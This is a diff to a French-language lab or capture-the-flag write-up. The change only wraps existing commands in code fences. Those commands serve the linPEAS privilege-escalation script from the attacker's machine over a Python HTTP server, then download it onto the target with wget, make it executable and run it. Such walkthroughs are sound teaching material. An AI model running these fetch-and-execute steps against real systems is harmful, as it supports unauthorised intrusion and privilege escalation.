@@ -198,10 +198,11 @@ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 sudo python3 -m http.server 8080
 ```
 Par la suite, depuis le serveur, on va télécharger linPEAS.sh:
-
+```bash
 cd /tmp
 wget 10.10.14.252:8080/linpeas.sh
 chmod +x linpeas.sh
+```
 
 Puis, on va l'exécuter:
 ```bash
